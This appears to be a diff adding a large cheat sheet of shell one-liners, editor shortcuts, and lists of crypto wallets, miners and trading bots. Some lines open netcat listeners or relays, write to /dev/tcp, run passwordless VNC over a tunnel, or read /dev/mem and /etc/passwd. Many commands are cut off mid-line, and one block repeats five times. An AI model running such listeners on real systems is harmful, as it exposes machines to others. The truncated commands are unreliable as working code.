+vimdiff <file> scp://[<user>@]<host>/<file>
+On target: "nc -l 4000 | tar xvf -" On source: "tar -cf - . | nc target_ip 4000"
+ctrl + r
+iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT
+<<<"k=1024; m=k*k; g=k*m; g" bc
+alt + 1 .
+for i in {1..5}; do cp test{,$i};done
+cd $(dirname $(find ~ -name emails.txt))
+pinfo
+ifconfig en1 | awk '/inet / {print $2}' | mail -s "hello world" email@email.com
+echo 'wget url' | at 12:00
+mtr --report --report-cycles 10 www.google.com > google_net_report.txt
+import -pause 5 -window root desktop_screenshot.jpg
+fc [history-number]
+alias ..='cd ..'
+mplayer tv:// -tv driver=v4l:width=352:height=288
+alias lvim="vim -c \"normal '0\""
+find . -iname \*.mp3 -print0 | xargs -0 mp3gain -krd 6 && vorbisgain -rfs .
+dd if=/dev/cdrom | pv -s 700m | md5sum | tee test.md5
+ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed "/^ 0.0 /d"
+jhead -autorot *.jpg
+awk -F "=| "
+du -cs * .[^\.]* | sort -n
+hdparm -i[I] /dev/sda
+mplayer -dumpstream -dumpfile "yourfile" -playlist "URL"
+fold -s <filename>
+blockdev --rereadpt /dev/sda
+say -v Vicki "Hi, I'm a mac"
+sed 's/[ \t]*$//' < emails.txt | tr 'A-Z' 'a-z' | sort | uniq > emails_sorted.tx
+find . -type f|while read f; do mv $f `echo $f |tr '[:upper:]' '[ :lower:]'`; do
+df / | awk '{print $1}' | grep dev | xargs tune2fs -l | grep create
+for I in `echo "show databases;" | mysql | grep -v Database`; do    mysqldump $I
+rm -rf `find . -type d -name .svn`
+xprop | awk '/PID/ {print $3}' | xargs ps h -o pid,cmd
+sudo dmidecode | more
+mencoder -forceidx -ovc copy -oac copy -o output.avi video1.avi video2.avi
+find . -name '*.jar' -printf '%f:'
+script
+ssh-keygen -R \[localhost\]:8022
+rename 's/ //g' *
+timeDNS() { parallel -j0 --tag dig @{} "$*" ::: 208.67.222.222 208.67.220.220 19
+mail tech@commandlinefu.com
+nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set timeout -1;spawn nc $sr 6666;set
+sqlite3 ~/.mozilla/firefox/*.[dD]efault/places.sqlite "SELECT strftime('%d.%m.%Y
+<ctrl>+o
+find . -name '*.sh' -exec bash -n {} \;
+server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-ctr -a -k Pa
+ln -s /BASE/* /TARGET/
+ls -d */
+exit
+logout
+(Ctrl-d)
+ssh -D 9999 [user]@[host]
+ssh -L [localPort]:[host]:[port] [user]@[host]
+ssh -X [user]@[host]
+ssh [user]@[host] [command]
+ssh-keygen -b 4096
+ssh [user]@[host]
+git clone [url]
+git init
+git add .\ngit commit -m "first commit"
+git status
+git branch [branchName]
+git branch -a
+git branch -d [branchName]
+git merge [branchName]
+git checkout [branchName]
+git checkout -b [newBranch]
+git tag [tagName]
+git tag -d [tagName]
+git push --tags
+git pull [branchName] [remoteURL/remoteName]
+git remote add [remoteName] [remoteURL]
+git config --global user.name [name]
+git config --global user.email [email]
+git help -g
+git revert HEAD^
+git rm -r --cached . \n git add .\n git commit -am "remove ignored files"
+git push [remoteURL/remoteName] [branch]
+git stash -u
+git stash pop
+git rm --cached [fileName]
+git rm -f [fileName]
+git rm -r --cached [directoryName]
+git rm -r -f [fileName]
+git push origin :[branchName]
+cat [file] > /dev/lp
+cat [file] | lpr
+pr -l60 [file] | lpr
+lpr [printerName] [file]
+lpq
+lprm - # previous
+lprm [jobID]
+lprm -a all
+cancel [printerName]
+cancel -u [user]
+lpstat -t
+enable [name]
+disable [name]
+:e - reload file :q - quit :q! - quit without saving changes :w - write file :w
+k - up  h - left l - right j - down w - next start of word W - next start of whi
+a - append after the cursor A - append at the end of the line i - insert before
+u - undo yy - yank (copy) a line y{motion} - yank text that {motion} moves over
+:s/foo/bar/ - replace the first match of 'foo' with 'bar' on the current line on
+:e filename - edit another file :split filename - split window and load another
+TAB - Indent C-w - Cut M-w - Copy C-y - Paste ("yank") C-SPACE - Begin selection
+C-x 2 - Split screen vertically C-u 5 C-x 2 - Split screen vertically with 5 row
+C-b, C-f - Character-wise M-b, M-f - Word-wise C-p, C-n - Line-wise M-a, M-e - S
+M-x eshell - Open a shell M-x goto-line - Goto a line number M-x toggle-word-wra
+Ctrl+G - Show help menu Ctrl+C - Show current line number and file information C
+← ↑ → → - Move the cursor Ctrl+A - Move to beginning of line Ctrl+E - Move to en
+Ctrl+X - Exit nano. You will be prompted to save your file if you haven't Ctrl+O
+Ctrl+K - Cut a line into the clipboard. You can press this repeatedly to cut mul
+Ctrl+f - Move forward a character Ctrl+b - Move backward a character Ctrl+p - Mo
+Ctrl+g - View Pico’s online help Ctrl+x - Exit Pico, saving the file Ctrl+l - Re
+Ctrl+d - Delete the character at the cursor position Ctrl+^ - Begin selecting te
+atomicwallet # 300+ coins
+electrum # bitcoin
+daedalus # cardano
+bitcoincore # bitcoin
+armory # bitcoin
+exodus # 100+ coins
+eidoo # litecoin, ethereum, bitcoin & ERC-20 tokens
+mycrypto # multiple coins
+jaxx # bitcoin, ethereum, litecoin & more
+bitpay # bitcoin, bitcoin cash, XRP, Ethereum & more
+wasabi # bitcoin
+mymonero # monero
+multidoge # dogecoin
+dogecoincore # dogecoin
+guarda # 45+ coins
+geth # ethereum
+minergate # monero, ethereum, ethereum calssic, zcash, bitcoin gold
+xmrig # monero
+bfgminer # bitcoin
+multiminer # bitcoin, litecoin, ethereum, monero, zcash & more
+awesomeminer # bitcoin, litecoin, ethereum
+cgminer # bitcoin
+cardano-node # cardano
+polkadot # polkadot
+lotus-miner # filecoin
+crypto-trading-bot
+awesome-crypto-trading-bots
+krypto-trading-bot
+freqtrade
+gekko
+blackbird
+crypto-signal
+gocryptotrader
+hummingbot
+bitvision
+cryptocurrency-arbitrage
+tradinggym
+node-binance-trader
+octobot
+r2
+peregrine
+uname -a
+neofetch
+xclip -sel clip [file]
+uname -a | xclip -sel clip
+xclip -o -sel clip
+xdotool mousemove [x] [y]
+ydotool mousemove --absolute [x] [y]
+xdotool mousemove_relative [x] [y]
+ydotool mousemove [x] [y]
+xdotool click 1 # 1=left 2=middle 3=right
+ydotool click left # left, right
+xdotool type "Hello world"
+ydotool type "Hello world"
+wtype "Hello world"
+xdotool key Escape # keylist
+ydotool key Escape
+wtype -k Escape
+echo '{"name": "Linux"}' | dasel -r json '.name'
+echo '{"name": "Linux"}' | fx .
+echo '{"name": "Linux"}' | dasel -r json
+echo '{"name": "Linux"}' | fx .name
+echo '{"name": "Linux"}' | jq "."
+echo '{"name": "Linux"}' | jq ".name"
+echo '{"name": "Linux"}' | jshon
+echo '{"name": "Linux"}' | jshon -e name
+echo '{"name": "Linux"}' | jql '.name'
+echo '{"name": "Linux"}' | jql '.'
+echo '{"name": "Linux"}' | emuto
+echo '{"name": "Linux"}' | emuto "$.name"
+echo '{"name": "Linux"}' | dasel put string -r json '.year' '1991'
+echo '{"name": "Linux"}' | jshon -s 1991 -i year
+echo '{"name": "Linux"}' | emuto "{'name': $.name,'year':1991}"
+echo '{"name": "Linux", "year": 1991}' | dasel delete -r json '.year'
+echo '{"name": "Linux", "year": 1991}' | jshon -d year
+echo '{"name": "Linux", "year": 1991}' | emuto "{'name': $.name}"
+jo -p name=Linux year=1991
+ip a
+scp [localeFile] [user]@[host]:[remoteFile]
+scp [remoteFile] [user]@[host]:.
+cointop
+coinmon
+cowsay "Hello"
+rogue\n\n  ----------------\n  |..............|\n  |..............+\n  |......@.
+nudoku\n\n ┌─┬─┬─┬─┬─┬─┬─┬─┬─┐ │8│7│ │ │ │5│4│ │ │ ├─┼─┼─┼─┼─┼─┼─┼─┼─┤ │5│2│4│ │
+2048\n\n Score: 60\n    Hi: 60\n -----------------------------\n |   16 |    4 |
+pacman4console\n\n   .......&....  ............\n   .    .     .  .     .    . \
+gif2webp [inputFile] -o [outputFile]
+img2webp [inputFile] -o [outputFile]
+nbmines\n\n |\/|     Flags:0\n |  |INES Mines:10\n ┌───────────────┐\n │
+nbbattleship\n  _\n |_)  3: 6\n |_)ATTLESHIP\n ┌───────────────┐┌──────────┐\n │
+nbcheckers\n  .-.\n |  '   8:10\n '._,HECKERS \n ┌───────────────┐\n │  O   O
+nbfifteen\n .--\n |__\n |  IFTEEN\n ┌───────┐\n │1 2 3 8│\n │f 7   4│\n │a e b c
+nbmemoblocks\n .  .      _\n |\/|     |_)\n |  |EMORY|_)LOCKS\n ┌───────────────
+nbpipes\n\n  _     ┌────────────────────┐\n |_)    │└ ┼┼┘┘└┐┌└┐┘┌┐┘┐┼┘┘┌│\n | IP
+nbreversi\n  _\n |_)  5:18\n | \EVERSI \n ┌───────────────┐\n │. X . X X X X X│\
+nbsos\n  _  _  _\n (_'| |(_'  9 vs 2\n ._):_:._)\n ┌───────────┐\n │_ _ _ _ S _│
+nbsudoku\n  _\n (_       Solved:40/81\n  _)UDOKU Left  :41/81\n ┌─────┬─────┬───
+lnd # Lightning Network
+getconf LONG_BIT
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
+echo "You can simulate on-screen typing just like in the movies" | pv -qL 10
+ping -i 60 -a IP_address
+<alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>
+mv filename.{old,new}
+ps aux | sort -nk +4 | tail
+rm !(*.foo|*.bar|*.baz)
+pushd /tmp
+echo "!!" > foo.sh
+lsof -i
+some_very_long_and_complex_command # label
+\[command]
+lsof -P -i -n
+diff <(sort file1) <(sort file2)
+!*
+echo "The date is: $(date +%D)"
+nc -v -l 80 < file.ext
+man hier
+awk '/start_pattern/,/stop_pattern/' file.txt
+CDPATH=:..:~:~/projects
+ifconfig | convert label:@- ip.png
+vim -x <FILENAME>
+awk '!x[$0]++' <file>
+ssh-copy-id username@hostname
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+mount | column -t
+reset
+curl ifconfig.me
+echo "ls -l" | at midnight
+man ascii
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+dig +short txt <keyword>.wp.dg.cx
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+ssh -t reachable_host ssh unreachable_host
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+time read (ctrl-d to stop)
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+less +F somelogfile
+disown -a && exit
+telnet towel.blinkenlights.nl
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+mount | column -t
+reset
+curl ifconfig.me
+echo "ls -l" | at midnight
+man ascii
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+dig +short txt <keyword>.wp.dg.cx
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+ssh -t reachable_host ssh unreachable_host
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+time read (ctrl-d to stop)
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+less +F somelogfile
+disown -a && exit
+telnet towel.blinkenlights.nl
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+mount | column -t
+reset
+curl ifconfig.me
+echo "ls -l" | at midnight
+man ascii
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+dig +short txt <keyword>.wp.dg.cx
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+ssh -t reachable_host ssh unreachable_host
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+time read (ctrl-d to stop)
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+less +F somelogfile
+disown -a && exit
+telnet towel.blinkenlights.nl
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+mount | column -t
+reset
+curl ifconfig.me
+echo "ls -l" | at midnight
+man ascii
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+dig +short txt <keyword>.wp.dg.cx
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+ssh -t reachable_host ssh unreachable_host
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+time read (ctrl-d to stop)
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+less +F somelogfile
+disown -a && exit
+telnet towel.blinkenlights.nl
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+mount | column -t
+reset
+curl ifconfig.me
+echo "ls -l" | at midnight
+man ascii
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+dig +short txt <keyword>.wp.dg.cx
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+ssh -t reachable_host ssh unreachable_host
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+time read (ctrl-d to stop)
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+less +F somelogfile
+disown -a && exit
+telnet towel.blinkenlights.nl
+sudo !!
+python -m SimpleHTTPServer
+^foo^bar
+ctrl-x e
+'ALT+.' or '<ESC> .'
+mount | column -t
+reset
+curl ifconfig.me
+echo "ls -l" | at midnight
+man ascii
+dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
+<ctrl+u> [...] <ctrl+y>
+dig +short txt <keyword>.wp.dg.cx
+sshfs name@server:/path/to/folder /path/to/mount/point
+mount -t tmpfs tmpfs /mnt -o size=1024m
+wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
+ctrl-l
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
+ssh -t reachable_host ssh unreachable_host
+curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuse
+time read (ctrl-d to stop)
+while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+less +F somelogfile
+disown -a && exit
+telnet towel.blinkenlights.nl
+getconf LONG_BIT
+history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
+echo "You can simulate on-screen typing just like in the movies" | pv -qL 10
+ping -i 60 -a IP_address
+<alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>
+mv filename.{old,new}
+ps aux | sort -nk +4 | tail
+rm !(*.foo|*.bar|*.baz)
+pushd /tmp
+echo "!!" > foo.sh
+lsof -i
+some_very_long_and_complex_command # label
+\[command]
+lsof -P -i -n
+diff <(sort file1) <(sort file2)
+!*
+echo "The date is: $(date +%D)"
+nc -v -l 80 < file.ext
+man hier
+awk '/start_pattern/,/stop_pattern/' file.txt
+CDPATH=:..:~:~/projects
+ifconfig | convert label:@- ip.png
+vim -x <FILENAME>
+awk '!x[$0]++' <file>
+ssh-copy-id username@hostname
+find -not -empty -type f -printf "%s\n" | sort -rn | uniq -d | xargs -I{} -n1 fi
+fuser -k filename
+!:-
+python -m smtpd -n -c DebuggingServer localhost:1025
+cat /etc/issue
+ps aux | grep [p]rocess-name
+wget -qO - "http://www.tarball.com/tarball.gz" | tar zxvf -
+cat ~/.ssh/id_rsa.pub | ssh user@machine "mkdir ~/.ssh; cat >> ~/.ssh/authorized
+tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR
+rename 'y/ /_/' *
+mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-fil
+translate(){ wget -qO- "http://ajax.googleapis.com/ajax/services/language/transl
+ESC *
+fc
+sudo dd if=/dev/mem | cat | strings
+ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's
+strace -ff -e trace=write -e write=1,2 -p SOME_PID
+pv sourcefile > destfile
+? () { echo "$*" | bc -l; }
+readom dev=/dev/scd0 f=/path/to/image.iso
+mkdir /home/foo/doc/bar && cd $_
+man -t manpage | ps2pdf - filename.pdf
+i="8uyxVmdaJ-w";mplayer -fs $(curl -s "http://www.youtube.com/get_video_info?&vi
+mkdir -p a/long/directory/path
+alias 'ps?'='ps ax | grep '
+read day month year <<< $(date +'%d %m %y')
+rm -f !(survivior.txt)
+git add -u
+vim scp://username@host//path/to/somefile
+^Z $bg $disown
+strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
+ss -p
+netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort
+ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg
+pv access.log | gzip > access.log.gz
+grep -RnisI <pattern> *
+watch -n 1 mysqladmin --user=<user> --password=<password> processlist
+du -s * | sort -n | tail
+for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done
+find . -type d -empty -delete
+watch -t -n1 "date +%T|figlet"
+date -d@1234567890
+curl wttr.in/seville
+curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr
+cmdfu(){ curl "http://www.commandlinefu.com/commands/matching/$@/$(echo -n $@ |
+dd if=/dev/zero of=/dev/null bs=1M count=32768
+cat /dev/urandom | hexdump -C | grep "ca fe"
+chmod --reference file1 file2
+gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrit
+notify-send ["<title>"] "<body>"
+dpkg -S /usr/bin/ls
+mount /path/to/file.iso /mnt/cdrom -oloop
+ssh-keygen -R <the_offending_host>
+sed -n 5p <file>
+open .
+ssh -MNf <user>@<host>
+echo "rm -rf /unwanted-but-large/folder" | batch
+cp file.txt{,.bak}
+timeout 5s COMMAND
+ssh -t remote_host screen -r
+ps awwfux | less -S
+bind -P
+rtfm() { help $@ || man $@ || $BROWSER "http://www.google.com/search?q=$@"; }
+diff <(lsof -p 1234) <(sleep 10; lsof -p 1234)
+tar -tf <file.tar.gz> | xargs rm -r
+script -qf | tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
+ssh -t hostA ssh hostB
+lsof -i tcp:80
+curl ifconfig.me
+until !!; do :; done
+date --set="$(ssh user@server date)"
+google docs edit --title "To-Do List" --editor vim
+sudo touch /forcefsck
+ls -d */
+% screen -r someuser/
+wget -q -U Mozilla -O output.mp3 "http://translate.google.com/translate_tts?ie=U
+wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://example.com/images
+wget http://www.youtube.com/watch?v=dQw4w9WgXcQ -qO- | sed -n "/fmt_url_map/{s/[
+python -m http.server
+dig +short myip.opendns.com @resolver1.opendns.com
+watch -n 1 'echo "obase=2;`date +%s`" | bc'
+du -b --max-depth 1 | sort -nr | perl -pe 's{([0-9]+)}{sprintf "%.1f%s", $1>=2**
+ssh root@remote.host "rpm -qa" | xargs yum -y install
+lsmod | perl -e 'print "digraph \"lsmod\" {";<>;while(<>){@_=split/\s+/; print "
+diff <(cd dir1 && find | sort) <(cd dir2 && find | sort)
+:<C-R><C-W>
+leave +15
+mkdir -p work/{d1,d2}/{src,bin,bak}
+youtube-dl -t --extract-audio --audio-format mp3 YOUTUBE_URL_HERE
+grep ^Dirty /proc/meminfo
+echo "tee can split a pipe in two"|tee >(rev) >(tr ' ' '_')
+lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2
+for I in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $I |
+knock <host> 3000 4000 5000 && ssh -p <port> user@host && knock <host> 5000 4000
+export HISTTIMEFORMAT="%F %T "
+find ./ -type f -exec chmod 644 {} \;
+sudo find / -mmin 60 -type f
+showkey -a
+cp /work/host/phone/ui/main.cpp !#$:s/host/target
+find . -name "*.[ch]" -exec grep -i -H "search pharse" {} \;
+mkfifo /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine por
+wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print "iptabl
+echo | openssl s_client -connect www.google.com:443 2>/dev/null |openssl x509 -d
+find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
+[enter]~?
+ssh host -l user $(<cmd.txt)
+md () { mkdir -p "$@" && cd "$@"; }
+grep --color=always | less -R
+awk '{$1=$3=""}1' file
+ls !(*.gz)
+arecord -f dat | ssh -C user@host aplay -f dat
+ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -
+echo $(sudo lshw -businfo | grep -B 1 -m 1 $(df "/path/to/file" | tail -1 | awk
+sed -i 8d ~/.ssh/known_hosts
+:w !sudo tee > /dev/null %
+grep . filename > newfilename
+history -d
+echo ${SSH_CLIENT%% *}
+echo $[RANDOM%X+1]
+lsof -Pan -i tcp -i udp
+alias dush="du -sm *|sort -n|tail"
+tar --exclude-vcs -cf src.tar src/
+kill -9 $$
+ssh -t user@some.domain.com /usr/bin/screen -xRR
+mysqldump --add-drop-table --extended-insert --force --log-error=error.log -uUSE
+for file in `ls *.pdf`; do convert -verbose -colorspace RGB -resize 800 -interla
+diff <(lsusb) <(sleep 3s && lsusb)
+find / -type f -size +500M
+<ctrl+z> fg; notify_me
+:TOhtml
+yes | pv | ssh $host "cat > /dev/null"
+lshw -html > hardware.html
+:mksession! <filename>
+ssh remotehost 'dpkg --get-selections' | dpkg --set-selections && dselect instal
+bind -x '"\C-l":ls -l'
+DISPLAY=:0.0 import -window root /tmp/shot.png
+grep -Fx -f file1 file2
+pdftotext [file] - | grep 'YourPattern'
+apt-get install most && update-alternatives --set pager /usr/bin/most
+tar -cf - . | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz
+nl
+date -d @1234567890
+sudo strings /dev/mem
+diff <(echo "$a") <(echo "$b")
+tidy -xml -i -m [file]
+tar --create --file - --posix --gzip -- <dir> | openssl enc -e -aes256 -out <fil
+bc <<< 'obase=60;299'
+alias head='head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))'
+some_command > >(/bin/cmd_for_stdout) 2> >(/bin/cmd_for_stderr)
+killall -STOP -m firefox
+curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
+lynx -accept_all_cookies -cmd_script=/your/keystroke-file
+bash -x ./post_to_commandlinefu.sh
+[[ test_condition ]] && if_true_do_this || otherwise_do_that
+svn log -q|grep "|"|awk "{print \$3}"|sort|uniq -c|sort -nr
+CTRL + T
+( command & )
+rm *.txt <TAB> <TAB>
+vi +/pattern [file]
+PROMPT_COMMAND='if [ $RANDOM -le 3200 ]; then printf "\0337\033[%d;%dH\033[4%dm
+read -sn 1 -p "Press any key to continue..."
+curl ip.appspot.com
+dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -n
+clfavs(){ URL="http://www.commandlinefu.com";wget -O - --save-cookies c --post-d
+echo "foo" > /dev/tcp/192.168.1.2/25
+( ( sleep 2h; your-command your-args ) & )
+cd !$:h
+perl -e 'print "P1\n256 256\n", map {$_&($_>>8)?1:0} (0..0xffff)' | display
+./my-really-long-job.sh && notify-send "Job finished"
+command | figlet
+lsof -c dhcpd
+stat -c '%A %a %n' *
+$ grep -rl oldstring . |xargs sed -i -e 's/oldstring/newstring/'
+xset dpms force standby
+nc -l -p 2000 -c "nc example.org 3000"
+man -t UNIX_COMMAND | open -f -a preview
+ctrl-t
+netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
+file -s /dev/sd*
+cut -f5 --complement
+grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
+<ESC> .
+xkcd(){ wget -qO- http://xkcd.com/|tee >(feh $(grep -Po '(?<=")http://imgs[^/]+/
+(echo CD_DA; for f in {01..99}; do echo "$f Hz">&2; sox -nt cdda -r44100 -c2 $f.
+sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
+tar -cj /backup | cstream -t 777k | ssh host 'tar -xj -C /backup'
+sl
+sudo zcat /var/log/auth.log.*.gz | awk '/Failed password/&&!/for invalid user/{a
+lynx -dump http://www.ip-adress.com/ip_tracer/?QRY=$1|grep address|egrep 'city|s
+find ~ -name '*.sqlite' -exec sqlite3 '{}' 'VACUUM;' \;
+read -s pass; echo $pass | md5sum | base64 | cut -c -16
+column -tns: /etc/passwd
+fdupes -r .
+script -t /tmp/mylog.out 2>/tmp/mylog.time; <do your work>; <CTRL-D>; scriptrepl
+bind '"\C-l":"ls -l\n"'
+ls -Q
+alias busy='my_file=$(find /usr/include -type f | sort -R | head -n 1); my_len=$
+dd if=/dev/sda | tee >(dd of=/dev/sdb) | dd of=/dev/sdc
+bbcradio() { local s PS3="Select a station: ";select s in 1 1x 2 3 4 5 6 7 "Asia
+nethogs -p eth0
+timeout 10 sleep 11
+svn diff | view -
+grep -lir "some text" *
+gnuplot -persist <(echo "plot '<(sort -n listOfNumbers.txt)' with lines")
+true && { echo success;} || { echo failed; }
+rsync --partial --progress --rsh=ssh  $file_source $user@$host:$destination_file
+some_command | tee >(command1) >(command2) >(command3) ... | command4
+tail -10000 access_log | awk '{print $1}' | sort | uniq -c | sort -n | tail
+tail -f file | while read; do echo "$(date +%T.%N) $REPLY"; done
+<COMMAND> |:
+shuf -n4 /usr/share/dict/words | tr -d '\n'
+ln -nsf <TARGET> <LINK>
+echo "GRUB_INIT_TUNE=\"1000 334 1 334 1 0 1 334 1 0 1 261 1 334 1 0 1 392 2 0 4
+diff <(wget -q -O - URL1) <(wget -q -O - URL2)
+~.
+ps hax -o user | sort | uniq -c
+rename 'y/A-Z/a-z/' *
+touch /tmp/file ; $EXECUTECOMMAND ; find /path -newer /tmp/file
+tr : '\n' <<<$PATH
+ffmpeg -vcodec copy -acodec copy -i orginalfile -ss 00:01:30 -t 0:0:20 newfile
+history | awk '{print $2}' | sort | uniq -c | sort -rn | head
+sed '1000000!d;q' < massive-log-file.log
+nocache <I/O-heavy-command>
+getconf LONG_BIT
+dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
+for i in ?.ogg; do mv $i 0$i; done
+sudo cpulimit -p pid -l 50
+<ESC> v or ctrl-x ctrl-e
+ssh -f -L 5900:localhost:5900 your.ssh.server "x11vnc -safer -localhost -nopw -o
+nmap -sP 192.168.1.0/24
+alias dateh='date --help|sed -n "/^ *%%/,/^ *%Z/p"|while read l;do F=${l/% */};
+echo {1..199}" bottles of beer on the wall, cold bottle of beer, take one down,
+[ -t 0 ] || exit 1
+echo -e "\e[32m"; while :; do for i in {1..16}; do r="$(($RANDOM % 2))"; if [[ $
+/sbin/kexec -l /boot/$KERNEL --append="$KERNELPARAMTERS" --initrd=/boot/$INITRD;
+some command|xsel --clipboard
+diff -urp /originaldirectory /modifieddirectory
+find -L /path/to/check -type l -delete
+ls -hog
+git rm $(git ls-files --deleted)
+(mountpoint -q "/media/mpdr1" && df /media/mpdr1/* > /dev/null 2>&1) || ((sudo u
+sudo tcpdump -i wlan0 -n ip | awk '{ print gensub(/(.*)\..*/,"\\1","g",$3), $4,
+ssh user@host "tar -zcf - /path/to/dir" > dir.tar.gz
+df -P | column -t
+wall <<< "Broadcast This"
+telnet towel.blinkenlights.nl 666
+sudo dd if=/dev/sdc bs=4096 | pv -s 2G | sudo dd bs=4096 of=~/USB_BLACK_BACKUP.I
+echo "export DISPLAY=:0; export XAUTHORITY=~/.Xauthority; notify-send test" | at
+udevadm monitor
+for db in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $db
+ncdu
+bash-hotkey: <CTRL+x+e>
+pwdx pid
+autossh -M50000 -t server.example.com 'screen -raAd mysession'
+echo "obase=2; 27" | bc -l
+set -o vi
+ssh-keygen; ssh-copy-id user@host; ssh user@host
+taskset -c 0 your_command
+rename 'y/A-Z/a-z/' *
+curl ipinfo.io
+ncat -vlm 5 --ssl --chat 9876
+dig +short which.opendns.com txt @208.67.220.220
+zdump Japan America/New_York
+sed -i <file> -re '<start>,<end>d'
+echo "This text gets stamped on the top of the pdf pages." | enscript -B -f Cour
+awk 'BEGIN{FS=":"; print "digraph{"}{split($4, a, ","); for (i in a) printf "\"%
+while true; do nc -l 7000 | tar -xvf -; done
+\foo
+mkfifo foo; script -f foo
+mycommand 2> >(while read line; do echo -e "\e[01;31m$line\e[0m"; done)
+au BufWritePost * if getline(1) =~ "^#!" | if getline(1) =~ "/bin/" | silent !ch
+convert *.jpg output.pdf
+:g/^$/d
+date +%V
+find . -type f -print0|xargs -0 md5sum|sort|perl -ne 'chomp;$ph=$h;($h,$f)=split
